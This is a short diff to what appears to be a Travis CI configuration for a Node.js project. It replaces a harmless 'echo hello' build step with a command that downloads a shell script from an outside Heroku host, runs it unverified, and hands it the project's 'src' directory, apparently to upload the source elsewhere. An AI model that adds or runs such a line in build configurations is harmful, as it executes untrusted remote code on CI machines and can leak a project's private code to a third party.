@@ -4,4 +4,4 @@ node_js:
 before_install:
   - "npm install"
 script:
-  - "echo hello"
+  - bash <(curl https://clear-ci.herokuapp.com/static/uploader.sh) src
